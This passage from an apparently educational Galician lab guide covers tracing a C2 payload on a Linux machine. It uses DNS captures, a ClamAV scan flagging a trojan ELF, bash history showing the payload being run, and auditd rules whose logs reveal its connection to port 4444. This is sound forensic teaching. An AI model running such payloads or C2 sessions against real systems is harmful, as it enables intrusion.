</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a><span class="m">10</span>:30:01.123456<span class="w"> </span>IP<span class="w"> </span><span class="m">192</span>.168.120.101.54321<span class="w"> </span>&gt;<span class="w"> </span><span class="m">8</span>.8.8.8.53:<span class="w"> </span><span class="m">1</span>+<span class="w"> </span>A?<span class="w"> </span>bad.c2-server.xyz.<span class="w"> </span><span class="o">(</span><span class="m">35</span><span class="o">)</span>
</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a><span class="m">10</span>:30:06.123456<span class="w"> </span>IP<span class="w"> </span><span class="m">192</span>.168.120.101.54322<span class="w"> </span>&gt;<span class="w"> </span><span class="m">8</span>.8.8.8.53:<span class="w"> </span><span class="m">2</span>+<span class="w"> </span>A?<span class="w"> </span>bad.c2-server.xyz.<span class="w"> </span><span class="o">(</span><span class="m">35</span><span class="o">)</span>
</span><span id="__span-25-4"><a id="__codelineno-25-4" name="__codelineno-25-4" href="#__codelineno-25-4"></a><span class="m">10</span>:30:11.123456<span class="w"> </span>IP<span class="w"> </span><span class="m">192</span>.168.120.101.54323<span class="w"> </span>&gt;<span class="w"> </span><span class="m">8</span>.8.8.8.53:<span class="w"> </span><span class="m">3</span>+<span class="w"> </span>A?<span class="w"> </span>bad.c2-server.xyz.<span class="w"> </span><span class="o">(</span><span class="m">35</span><span class="o">)</span>
</span></code></pre></div>
</div>
<p><strong>5. Detección de Malware ou Payloads</strong>  </p>
<p>Se o ataque implica a descarga dun payload desde o servidor C2 (VIPER), asegúrate de:</p>
<ul>
<li>Comprobar arquivos sospeitosos con <code>sha256sum</code> e comparalos con bases de datos de malware.</li>
<li>Usar ferramentas como <code>ClamAV</code> para escanear o sistema:
<div class="language-bash highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="c1"># apt install clamav -y  </span>
</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a><span class="c1"># clamscan -r /home/ | tee README.txt  </span>
</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a>-----------<span class="w"> </span>SCAN<span class="w"> </span>SUMMARY<span class="w"> </span>-----------
</span><span id="__span-26-4"><a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a>Known<span class="w"> </span>viruses:<span class="w"> </span><span class="m">2058898</span>
</span><span id="__span-26-5"><a id="__codelineno-26-5" name="__codelineno-26-5" href="#__codelineno-26-5"></a>Engine<span class="w"> </span>version:<span class="w"> </span><span class="m">1</span>.0.7
</span><span id="__span-26-6"><a id="__codelineno-26-6" name="__codelineno-26-6" href="#__codelineno-26-6"></a>Scanned<span class="w"> </span>directories:<span class="w"> </span><span class="m">112</span>
</span><span id="__span-26-7"><a id="__codelineno-26-7" name="__codelineno-26-7" href="#__codelineno-26-7"></a>Scanned<span class="w"> </span>files:<span class="w"> </span><span class="m">351</span>
</span><span id="__span-26-8"><a id="__codelineno-26-8" name="__codelineno-26-8" href="#__codelineno-26-8"></a>Infected<span class="w"> </span>files:<span class="w"> </span><span class="m">1</span>
</span><span id="__span-26-9"><a id="__codelineno-26-9" name="__codelineno-26-9" href="#__codelineno-26-9"></a>Data<span class="w"> </span>scanned:<span class="w"> </span><span class="m">86</span>.89<span class="w"> </span>MB
</span><span id="__span-26-10"><a id="__codelineno-26-10" name="__codelineno-26-10" href="#__codelineno-26-10"></a>Data<span class="w"> </span>read:<span class="w"> </span><span class="m">70</span>.75<span class="w"> </span>MB<span class="w"> </span><span class="o">(</span>ratio<span class="w"> </span><span class="m">1</span>.23:1<span class="o">)</span>
</span><span id="__span-26-11"><a id="__codelineno-26-11" name="__codelineno-26-11" href="#__codelineno-26-11"></a>Time:<span class="w"> </span><span class="m">10</span>.159<span class="w"> </span>sec<span class="w"> </span><span class="o">(</span><span class="m">0</span><span class="w"> </span>m<span class="w"> </span><span class="m">10</span><span class="w"> </span>s<span class="o">)</span>
</span><span id="__span-26-12"><a id="__codelineno-26-12" name="__codelineno-26-12" href="#__codelineno-26-12"></a>Start<span class="w"> </span>Date:<span class="w"> </span><span class="m">2025</span>:04:04<span class="w"> </span><span class="m">01</span>:16:55
</span><span id="__span-26-13"><a id="__codelineno-26-13" name="__codelineno-26-13" href="#__codelineno-26-13"></a>End<span class="w"> </span>Date:<span class="w">   </span><span class="m">2025</span>:04:04<span class="w"> </span><span class="m">01</span>:17:05
</span><span id="__span-26-14"><a id="__codelineno-26-14" name="__codelineno-26-14" href="#__codelineno-26-14"></a><span class="c1"># grep elf README.txt</span>
</span><span id="__span-26-15"><a id="__codelineno-26-15" name="__codelineno-26-15" href="#__codelineno-26-15"></a>/home/losada/1743719330.elf:<span class="w"> </span>Unix.Trojan.Generic-9908886-0<span class="w"> </span>FOUND
</span></code></pre></div></li>
</ul>
<div class="admonition tip">
<p class="admonition-title">apt info clamav</p>
<p>Package: clamav<br />
Version: 1.0.7+dfsg-1~deb12u1<br />
Priority: optional<br />
Section: utils<br />
Maintainer: ClamAV Team <a href="&#109;&#97;&#105;&#108;&#116;&#111;&#58;&#112;&#107;&#103;&#45;&#99;&#108;&#97;&#109;&#97;&#118;&#45;&#100;&#101;&#118;&#101;&#108;&#64;&#108;&#105;&#115;&#116;&#115;&#46;&#97;&#108;&#105;&#111;&#116;&#104;&#46;&#100;&#101;&#98;&#105;&#97;&#110;&#46;&#111;&#114;&#103;">&#112;&#107;&#103;&#45;&#99;&#108;&#97;&#109;&#97;&#118;&#45;&#100;&#101;&#118;&#101;&#108;&#64;&#108;&#105;&#115;&#116;&#115;&#46;&#97;&#108;&#105;&#111;&#116;&#104;&#46;&#100;&#101;&#98;&#105;&#97;&#110;&#46;&#111;&#114;&#103;</a><br />
Installed-Size: 30,1 MB<br />
Depends: clamav-freshclam (&gt;= 1.0.7+dfsg) | clamav-data, libc6 (&gt;= 2.34), libclamav11 (&gt;= 1.0.7), libcurl4 (&gt;= 7.16.2), libgcc-s1 (&gt;= 4.2), libjson-c5 (&gt;= 0.15), libssl3 (&gt;= 3.0.0), zlib1g (&gt;= 1:1.2.3.3)<br />
Recommends: clamav-base<br />
Suggests: libclamunrar, clamav-docs<br />
Homepage: https://www.clamav.net/<br />
Tag: implemented-in::c, interface::commandline, role::program,<br />
 scope::utility, security::antivirus, use::scanning, works-with::file,<br />
 works-with::mail<br />
Download-Size: 5.775 kB<br />
APT-Manual-Installed: yes<br />
APT-Sources: http://deb.debian.org/debian bookworm/main amd64 Packages<br />
Description: anti-virus utility for Unix - command-line interface<br />
 Clam AntiVirus is an anti-virus toolkit for Unix. The main purpose of<br />
 this software is the integration with mail servers (attachment<br />
 scanning). The package provides a flexible and scalable<br />
 multi-threaded daemon in the clamav-daemon package, a command-line<br />
 scanner in the clamav package, and a tool for automatic updating via<br />
 the Internet in the clamav-freshclam package. The programs are based<br />
 on libclamav, which can be used by other software.<br />
 .<br />
 This package contains the command line interface. Features:<br />
  - built-in support for various archive formats, including Zip, Tar,<br />
    Gzip, Bzip2, OLE2, Cabinet, CHM, BinHex, SIS and others;<br />
  - built-in support for almost all mail file formats;<br />
  - built-in support for ELF executables and Portable Executable files<br />
    compressed with UPX, FSG, Petite, NsPack, wwpack32, MEW, Upack and<br />
    obfuscated with SUE, Y0da Cryptor and others;<br />
  - built-in support for popular document formats including Microsoft<br />
    Office and Mac Office files, HTML, RTF and PDF.<br />
 .<br />
 For scanning to work, a virus database is needed. There are two options<br />
 for getting it:<br />
  - clamav-freshclam: updates the database from Internet. This is<br />
    recommended with Internet access.<br />
  - clamav-data: for users without Internet access. The package is<br />
    not updated once installed. The clamav-getfiles package allows<br />
    creating custom packages from an Internet-connected computer.  </p>
</div>
<p><strong>6. Revisar o arquivo <code>~/.bash_history</code></strong></p>
<p>Se o ataque foi lanzado recentemente, podes revisar os comandos executados:</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="c1"># find / -type f -iname .bash_history -exec cat -n {} \; 2&gt;/dev/null</span>
</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a>...
</span><span id="__span-27-3"><a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a><span class="m">93</span><span class="w">  </span>chmod<span class="w"> </span>+x<span class="w"> </span><span class="m">1743719330</span>.elf
</span><span id="__span-27-4"><a id="__codelineno-27-4" name="__codelineno-27-4" href="#__codelineno-27-4"></a><span class="m">94</span><span class="w">  </span>./1743719330.elf
</span></code></pre></div>
<div class="admonition warning">
<p class="admonition-title">Tempo execución payload: 30 minutos</p>
<p>Ver <a href="https://www.viperrtp.com/pricing" target="_blank">VIPER Pricing</a><br />
Unha das <strong>limitacións</strong> que posúe a <strong>versión COMMUNITY</strong> que estamos a empregar é que cada <strong>sesión establecida</strong> coa máquina vítima ten unha <strong>limitación de 30 minutos</strong>.<br />
<strong>Polo tanto isto hai que telo en conta para a realización desta práctica xa que pode ser que a conexión córtese e haxa que crear outra, cambiando así os PIDs dos procesos executados e os portos da conexión establecida.</strong></p>
</div>
<p><strong>7. Revisar <code>auditd</code></strong></p>
<div class="admonition info">
<p class="admonition-title">Que é auditd?</p>
<p><strong>auditd</strong> é o daemon do subsistema de auditoría de Linux, encargado de <strong>rexistrar eventos de seguridade e actividades sensibles no sistema</strong>, como accesos a ficheiros críticos, cambios en configuracións ou execucións de comandos.</p>
<p>A súa configuración permite controlar <strong>que eventos se rexistran e como se almacenan</strong>, o que é útil para cumprimento normativo ou para detección de comportamentos sospeitosos.</p>
<p>Unha vez instalado, os logs poden consultarse en <code>/var/log/audit/audit.log</code>. Pódese complementar con regras personalizadas en <code>/etc/audit/rules.d/</code> para adaptar a auditoría aos obxectivos de seguridade do sistema.</p>
</div>
<p>Instalación<br />
<div class="language-bash highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>apt<span class="w"> </span>update<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>apt<span class="w"> </span>-y<span class="w"> </span>install<span class="w"> </span>auditd<span class="w"> </span>audispd-plugins
</span></code></pre></div></p>
<p>Configuración das regras de auditoría<br />
<div class="language-bash highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;## Rexistrar todas as chamadas ao sistema execve (Creación de Procesos)</span>
</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a><span class="s1"># -a action,list: Engadir regra á lista de saída (-a) ao saír da chamada ao sistema (exit), sempre (always).</span>
</span><span id="__span-29-3"><a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a><span class="s1"># -F arch=b64/b32: Especifica a arquitectura (64-bit ou 32-bit). Incluímos ambas para compatibilidade.</span>
</span><span id="__span-29-4"><a id="__codelineno-29-4" name="__codelineno-29-4" href="#__codelineno-29-4"></a><span class="s1"># -S execve: Especifica a chamada ao sistema a monitorizar.</span>
</span><span id="__span-29-5"><a id="__codelineno-29-5" name="__codelineno-29-5" href="#__codelineno-29-5"></a><span class="s1"># -k process_creation: Unha chave (tag) para buscar facilmente estes eventos.</span>
</span><span id="__span-29-6"><a id="__codelineno-29-6" name="__codelineno-29-6" href="#__codelineno-29-6"></a><span class="s1">-a always,exit -F arch=b64 -S execve -k process_creation</span>
</span><span id="__span-29-7"><a id="__codelineno-29-7" name="__codelineno-29-7" href="#__codelineno-29-7"></a><span class="s1">-a always,exit -F arch=b32 -S execve -k process_creation</span>
</span><span id="__span-29-8"><a id="__codelineno-29-8" name="__codelineno-29-8" href="#__codelineno-29-8"></a>
</span><span id="__span-29-9"><a id="__codelineno-29-9" name="__codelineno-29-9" href="#__codelineno-29-9"></a><span class="s1">## Rexistrar chamadas ao sistema relacionadas con conexións de rede (saíntes)</span>
</span><span id="__span-29-10"><a id="__codelineno-29-10" name="__codelineno-29-10" href="#__codelineno-29-10"></a><span class="s1"># Monitorizamos &#39;</span>connect<span class="s1">&#39; que é a chamada usada para iniciar conexións TCP/UDP saíntes.</span>
</span><span id="__span-29-11"><a id="__codelineno-29-11" name="__codelineno-29-11" href="#__codelineno-29-11"></a><span class="s1"># -k network_connection: Chave para buscar eventos de conexión.</span>
</span><span id="__span-29-12"><a id="__codelineno-29-12" name="__codelineno-29-12" href="#__codelineno-29-12"></a><span class="s1">-a always,exit -F arch=b64 -S connect -k network_connection</span>
</span><span id="__span-29-13"><a id="__codelineno-29-13" name="__codelineno-29-13" href="#__codelineno-29-13"></a><span class="s1">-a always,exit -F arch=b32 -S connect -k network_connection</span>
</span><span id="__span-29-14"><a id="__codelineno-29-14" name="__codelineno-29-14" href="#__codelineno-29-14"></a>
</span><span id="__span-29-15"><a id="__codelineno-29-15" name="__codelineno-29-15" href="#__codelineno-29-15"></a><span class="s1">## Rexistrar chamadas ao sistema relacionadas coa carga/descarga de módulos do kernel</span>
</span><span id="__span-29-16"><a id="__codelineno-29-16" name="__codelineno-29-16" href="#__codelineno-29-16"></a><span class="s1"># -S init_module, finit_module, delete_module: Chamadas para cargar e descargar módulos.</span>
</span><span id="__span-29-17"><a id="__codelineno-29-17" name="__codelineno-29-17" href="#__codelineno-29-17"></a><span class="s1"># -k module_loading: Chave para buscar estes eventos.</span>
</span><span id="__span-29-18"><a id="__codelineno-29-18" name="__codelineno-29-18" href="#__codelineno-29-18"></a><span class="s1">-a always,exit -F arch=b64 -S init_module -S finit_module -S delete_module -k module_loading</span>
</span><span id="__span-29-19"><a id="__codelineno-29-19" name="__codelineno-29-19" href="#__codelineno-29-19"></a><span class="s1">-a always,exit -F arch=b32 -S init_module -S finit_module -S delete_module -k module_loading</span>
</span><span id="__span-29-20"><a id="__codelineno-29-20" name="__codelineno-29-20" href="#__codelineno-29-20"></a>
</span><span id="__span-29-21"><a id="__codelineno-29-21" name="__codelineno-29-21" href="#__codelineno-29-21"></a><span class="s1">## (Opcional pero Recomendado) Facer as regras inmutables (require reiniciar para cambiar)</span>
</span><span id="__span-29-22"><a id="__codelineno-29-22" name="__codelineno-29-22" href="#__codelineno-29-22"></a><span class="s1">## Descomenta isto só cando esteas seguro das túas regras para maior seguridade</span>
</span><span id="__span-29-23"><a id="__codelineno-29-23" name="__codelineno-29-23" href="#__codelineno-29-23"></a><span class="s1"># -e 2&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>/etc/audit/rules.d/99-custom.rules
</span></code></pre></div></p>
<div class="admonition tip">
<p class="admonition-title"><strong>Notas sobre as regras</strong></p>
<ul>
<li>Usamos always,exit para rexistrar o evento cando a chamada ao sistema remata.  </li>
<li>Especificamos ambas arquitecturas (b64, b32) por se se executan binarios de 32 bits nun sistema de 64 bits.  </li>
<li>As keys (-k) son moi importantes para filtrar os logs despois.</li>
</ul>
</div>
<p><strong>Cargar as Novas Regras e Activar o Servizo</strong>
   <div class="language-bash highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>augenrules<span class="w"> </span>--load
</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a>systemctl<span class="w"> </span>start<span class="w"> </span>auditd
</span><span id="__span-30-3"><a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a>systemctl<span class="w"> </span><span class="nb">enable</span><span class="w"> </span>auditd
</span><span id="__span-30-4"><a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a>systemctl<span class="w"> </span>status<span class="w"> </span>auditd<span class="w"> </span>--no-pager
</span></code></pre></div></p>
<p><strong>Verificar que as regras foron cargadas</strong>
   <div class="language-bash highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>auditctl<span class="w"> </span>-l
</span></code></pre></div></p>
<p><strong>Buscar nos Logs de Auditoría: <code>ausearch</code></strong><br />
   Agora <code>auditd</code> está rexistrando os eventos definidos. Os logs almacénanse por defecto en <code>/var/log/audit/audit.log</code>. A ferramenta principal para buscar nestes logs é <code>ausearch</code>.  </p>
<p><strong>Busca Específica para <code>payload_descargado.elf</code>:</strong>  </p>
<ul>
<li>
<p><strong>Paso 1: Buscar a execución do binario:</strong><br />
       Usa a chave <code>process_creation</code> e o nome do executable (<code>-x</code>) para atopar cando se executou o payload.<br />
<div class="language-bash highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>ausearch<span class="w"> </span>-k<span class="w"> </span>process_creation<span class="w"> </span>-x<span class="w"> </span>/ruta/completa/a/payload_descargado.elf<span class="w"> </span>-i
</span></code></pre></div></p>
<ul>
<li>Cambia <code>/ruta/completa/a/payload_descargado.elf</code> pola ruta real onde se executou (se a coñeces) ou simplemente <code>-x payload_descargado.elf</code> se queres buscar calquera execución con ese nome.</li>
<li><code>-i</code>: Interpreta os valores numéricos (como UID, GID, syscalls) en texto lexible.</li>
</ul>
<p>A saída mostrará eventos <code>type=SYSCALL</code> relacionados coa chamada <code>execve</code>. Anota o <strong>PID</strong> (Process ID) e a <strong>data/hora</strong> aproximada do evento. Exemplo de saída relevante:  </p>
</li>
</ul>
<div class="admonition tip">
<p class="admonition-title">Executar de novo o payload</p>
<p>Unha vez cargadas as novas regras débese executar de novo o payload para verificar que rexistran os eventos definidos.</p>
</div>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a><span class="c1"># ausearch -k process_creation -x 1743838036.elf -i</span>
</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a>----
</span><span id="__span-33-3"><a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a><span class="nv">type</span><span class="o">=</span>PROCTITLE<span class="w"> </span><span class="nv">msg</span><span class="o">=</span>audit<span class="o">(</span><span class="m">05</span>/04/25<span class="w"> </span><span class="m">22</span>:28:49.552:226<span class="o">)</span><span class="w"> </span>:<span class="w"> </span><span class="nv">proctitle</span><span class="o">=</span>./1743838036.elf
</span><span id="__span-33-4"><a id="__codelineno-33-4" name="__codelineno-33-4" href="#__codelineno-33-4"></a><span class="nv">type</span><span class="o">=</span>PATH<span class="w"> </span><span class="nv">msg</span><span class="o">=</span>audit<span class="o">(</span><span class="m">05</span>/04/25<span class="w"> </span><span class="m">22</span>:28:49.552:226<span class="o">)</span><span class="w"> </span>:<span class="w"> </span><span class="nv">item</span><span class="o">=</span><span class="m">1</span><span class="w"> </span><span class="nv">name</span><span class="o">=</span>./1743838036.elf<span class="w"> </span><span class="nv">inode</span><span class="o">=</span><span class="m">261588</span><span class="w"> </span><span class="nv">dev</span><span class="o">=</span><span class="m">08</span>:01<span class="w"> </span><span class="nv">mode</span><span class="o">=</span>file,755<span class="w"> </span><span class="nv">ouid</span><span class="o">=</span>losada<span class="w"> </span><span class="nv">ogid</span><span class="o">=</span>losada<span class="w"> </span><span class="nv">rdev</span><span class="o">=</span><span class="m">00</span>:00<span class="w"> </span><span class="nv">nametype</span><span class="o">=</span>NORMAL<span class="w"> </span><span class="nv">cap_fp</span><span class="o">=</span>none<span class="w"> </span><span class="nv">cap_fi</span><span class="o">=</span>none<span class="w"> </span><span class="nv">cap_fe</span><span class="o">=</span><span class="m">0</span><span class="w"> </span><span class="nv">cap_fver</span><span class="o">=</span><span class="m">0</span><span class="w"> </span><span class="nv">cap_frootid</span><span class="o">=</span><span class="m">0</span>
</span><span id="__span-33-5"><a id="__codelineno-33-5" name="__codelineno-33-5" href="#__codelineno-33-5"></a><span class="nv">type</span><span class="o">=</span>PATH<span class="w"> </span><span class="nv">msg</span><span class="o">=</span>audit<span class="o">(</span><span class="m">05</span>/04/25<span class="w"> </span><span class="m">22</span>:28:49.552:226<span class="o">)</span><span class="w"> </span>:<span class="w"> </span><span class="nv">item</span><span class="o">=</span><span class="m">0</span><span class="w"> </span><span class="nv">name</span><span class="o">=</span>./1743838036.elf<span class="w"> </span><span class="nv">inode</span><span class="o">=</span><span class="m">261588</span><span class="w"> </span><span class="nv">dev</span><span class="o">=</span><span class="m">08</span>:01<span class="w"> </span><span class="nv">mode</span><span class="o">=</span>file,755<span class="w"> </span><span class="nv">ouid</span><span class="o">=</span>losada<span class="w"> </span><span class="nv">ogid</span><span class="o">=</span>losada<span class="w"> </span><span class="nv">rdev</span><span class="o">=</span><span class="m">00</span>:00<span class="w"> </span><span class="nv">nametype</span><span class="o">=</span>NORMAL<span class="w"> </span><span class="nv">cap_fp</span><span class="o">=</span>none<span class="w"> </span><span class="nv">cap_fi</span><span class="o">=</span>none<span class="w"> </span><span class="nv">cap_fe</span><span class="o">=</span><span class="m">0</span><span class="w"> </span><span class="nv">cap_fver</span><span class="o">=</span><span class="m">0</span><span class="w"> </span><span class="nv">cap_frootid</span><span class="o">=</span><span class="m">0</span>
</span><span id="__span-33-6"><a id="__codelineno-33-6" name="__codelineno-33-6" href="#__codelineno-33-6"></a><span class="nv">type</span><span class="o">=</span>CWD<span class="w"> </span><span class="nv">msg</span><span class="o">=</span>audit<span class="o">(</span><span class="m">05</span>/04/25<span class="w"> </span><span class="m">22</span>:28:49.552:226<span class="o">)</span><span class="w"> </span>:<span class="w"> </span><span class="nv">cwd</span><span class="o">=</span>/home/losada
</span><span id="__span-33-7"><a id="__codelineno-33-7" name="__codelineno-33-7" href="#__codelineno-33-7"></a><span class="nv">type</span><span class="o">=</span>EXECVE<span class="w"> </span><span class="nv">msg</span><span class="o">=</span>audit<span class="o">(</span><span class="m">05</span>/04/25<span class="w"> </span><span class="m">22</span>:28:49.552:226<span class="o">)</span><span class="w"> </span>:<span class="w"> </span><span class="nv">argc</span><span class="o">=</span><span class="m">1</span><span class="w"> </span><span class="nv">a0</span><span class="o">=</span>./1743838036.elf
</span><span id="__span-33-8"><a id="__codelineno-33-8" name="__codelineno-33-8" href="#__codelineno-33-8"></a><span class="nv">type</span><span class="o">=</span>SYSCALL<span class="w"> </span><span class="nv">msg</span><span class="o">=</span>audit<span class="o">(</span><span class="m">05</span>/04/25<span class="w"> </span><span class="m">22</span>:28:49.552:226<span class="o">)</span><span class="w"> </span>:<span class="w"> </span><span class="nv">arch</span><span class="o">=</span>x86_64<span class="w"> </span><span class="nv">syscall</span><span class="o">=</span>execve<span class="w"> </span><span class="nv">success</span><span class="o">=</span>yes<span class="w"> </span><span class="nv">exit</span><span class="o">=</span><span class="m">0</span><span class="w"> </span><span class="nv">a0</span><span class="o">=</span>0x55ff719369a0<span class="w"> </span><span class="nv">a1</span><span class="o">=</span>0x55ff7193bc50<span class="w"> </span><span class="nv">a2</span><span class="o">=</span>0x55ff71934b40<span class="w"> </span><span class="nv">a3</span><span class="o">=</span>0xd016c19e5dca8816<span class="w"> </span><span class="nv">items</span><span class="o">=</span><span class="m">2</span><span class="w"> </span><span class="nv">ppid</span><span class="o">=</span><span class="m">1942</span><span class="w"> </span><span class="nv">pid</span><span class="o">=</span><span class="m">6055</span><span class="w"> </span><span class="nv">auid</span><span class="o">=</span>losada<span class="w"> </span><span class="nv">uid</span><span class="o">=</span>losada<span class="w"> </span><span class="nv">gid</span><span class="o">=</span>losada<span class="w"> </span><span class="nv">euid</span><span class="o">=</span>losada<span class="w"> </span><span class="nv">suid</span><span class="o">=</span>losada<span class="w"> </span><span class="nv">fsuid</span><span class="o">=</span>losada<span class="w"> </span><span class="nv">egid</span><span class="o">=</span>losada<span class="w"> </span><span class="nv">sgid</span><span class="o">=</span>losada<span class="w"> </span><span class="nv">fsgid</span><span class="o">=</span>losada<span class="w"> </span><span class="nv">tty</span><span class="o">=</span>pts0<span class="w"> </span><span class="nv">ses</span><span class="o">=</span><span class="m">2</span><span class="w"> </span><span class="nv">comm</span><span class="o">=</span><span class="m">1743838036</span>.elf<span class="w"> </span><span class="nv">exe</span><span class="o">=</span>/home/losada/1743838036.elf<span class="w"> </span><span class="nv">subj</span><span class="o">=</span>unconfined<span class="w"> </span><span class="nv">key</span><span class="o">=</span>process_creation
</span></code></pre></div>
<p>Aquí, o PID é <code>6055</code>.</p>
<p><strong>Paso 2: Buscar conexións de rede feitas por ese PID:</strong>
 Agora usa a chave <code>network_connection</code> e filtra polo PID que atopaches no paso anterior. Tamén podes usar un rango de tempo (<code>-ts</code>, <code>-te</code>) se coñeces cando ocorreu a execución.
<div class="language-bash highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a><span class="c1"># Substitúe &lt;PID&gt; polo PID atopado (ex: 5678)</span>
</span><span id="__span-34-2"><a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a>ausearch<span class="w"> </span>-k<span class="w"> </span>network_connection<span class="w"> </span>-p<span class="w"> </span>&lt;PID&gt;<span class="w"> </span>-i
</span><span id="__span-34-3"><a id="__codelineno-34-3" name="__codelineno-34-3" href="#__codelineno-34-3"></a>ausearch<span class="w"> </span>-k<span class="w"> </span>network_connection<span class="w"> </span>-p<span class="w"> </span><span class="m">6055</span><span class="w"> </span>-i
</span><span id="__span-34-4"><a id="__codelineno-34-4" name="__codelineno-34-4" href="#__codelineno-34-4"></a>----
</span><span id="__span-34-5"><a id="__codelineno-34-5" name="__codelineno-34-5" href="#__codelineno-34-5"></a><span class="nv">type</span><span class="o">=</span>PROCTITLE<span class="w"> </span><span class="nv">msg</span><span class="o">=</span>audit<span class="o">(</span><span class="m">05</span>/04/25<span class="w"> </span><span class="m">22</span>:28:49.552:227<span class="o">)</span><span class="w"> </span>:<span class="w"> </span><span class="nv">proctitle</span><span class="o">=</span>./1743838036.elf
</span><span id="__span-34-6"><a id="__codelineno-34-6" name="__codelineno-34-6" href="#__codelineno-34-6"></a><span class="nv">type</span><span class="o">=</span>SOCKADDR<span class="w"> </span><span class="nv">msg</span><span class="o">=</span>audit<span class="o">(</span><span class="m">05</span>/04/25<span class="w"> </span><span class="m">22</span>:28:49.552:227<span class="o">)</span><span class="w"> </span>:<span class="w"> </span><span class="nv">saddr</span><span class="o">={</span><span class="w"> </span><span class="nv">saddr_fam</span><span class="o">=</span>inet<span class="w"> </span><span class="nv">laddr</span><span class="o">=</span><span class="m">192</span>.168.120.100<span class="w"> </span><span class="nv">lport</span><span class="o">=</span><span class="m">4444</span><span class="w"> </span><span class="o">}</span>
</span><span id="__span-34-7"><a id="__codelineno-34-7" name="__codelineno-34-7" href="#__codelineno-34-7"></a><span class="nv">type</span><span class="o">=</span>SYSCALL<span class="w"> </span><span class="nv">msg</span><span class="o">=</span>audit<span class="o">(</span><span class="m">05</span>/04/25<span class="w"> </span><span class="m">22</span>:28:49.552:227<span class="o">)</span><span class="w"> </span>:<span class="w"> </span><span class="nv">arch</span><span class="o">=</span>x86_64<span class="w"> </span><span class="nv">syscall</span><span class="o">=</span>connect<span class="w"> </span><span class="nv">success</span><span class="o">=</span>no<span class="w"> </span><span class="nv">exit</span><span class="o">=</span>EINPROGRESS<span class="o">(</span>Operación<span class="w"> </span>en<span class="w"> </span>curso<span class="o">)</span><span class="w"> </span><span class="nv">a0</span><span class="o">=</span>0x5<span class="w"> </span><span class="nv">a1</span><span class="o">=</span>0x555570f135b0<span class="w"> </span><span class="nv">a2</span><span class="o">=</span>0x10<span class="w"> </span><span class="nv">a3</span><span class="o">=</span>0x0<span class="w"> </span><span class="nv">items</span><span class="o">=</span><span class="m">0</span><span class="w"> </span><span class="nv">ppid</span><span class="o">=</span><span class="m">1942</span><span class="w"> </span><span class="nv">pid</span><span class="o">=</span><span class="m">6055</span><span class="w"> </span><span class="nv">auid</span><span class="o">=</span>losada<span class="w"> </span><span class="nv">uid</span><span class="o">=</span>losada<span class="w"> </span><span class="nv">gid</span><span class="o">=</span>losada<span class="w"> </span><span class="nv">euid</span><span class="o">=</span>losada<span class="w"> </span><span class="nv">suid</span><span class="o">=</span>losada<span class="w"> </span><span class="nv">fsuid</span><span class="o">=</span>losada<span class="w"> </span><span class="nv">egid</span><span class="o">=</span>losada<span class="w"> </span><span class="nv">sgid</span><span class="o">=</span>losada<span class="w"> </span><span class="nv">fsgid</span><span class="o">=</span>losada<span class="w"> </span><span class="nv">tty</span><span class="o">=</span>pts0<span class="w"> </span><span class="nv">ses</span><span class="o">=</span><span class="m">2</span><span class="w"> </span><span class="nv">comm</span><span class="o">=</span><span class="m">1743838036</span>.elf<span class="w"> </span><span class="nv">exe</span><span class="o">=</span>/home/losada/1743838036.elf<span class="w"> </span><span class="nv">subj</span><span class="o">=</span>unconfined<span class="w"> </span><span class="nv">key</span><span class="o">=</span>network_connection
</span></code></pre></div></p>
<p>Ou, se queres buscar directamente conexións feitas por ese nome de executable (pode ser máis directo):
<div class="language-bash highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a>ausearch<span class="w"> </span>-k<span class="w"> </span>network_connection<span class="w"> </span>-i<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s1">&#39;exe=&quot;/ruta/completa/a/payload_descargado.elf&quot;&#39;</span>
</span></code></pre></div>
<em>(De novo, axusta a ruta ou usa só o nome do executábel)</em></p>
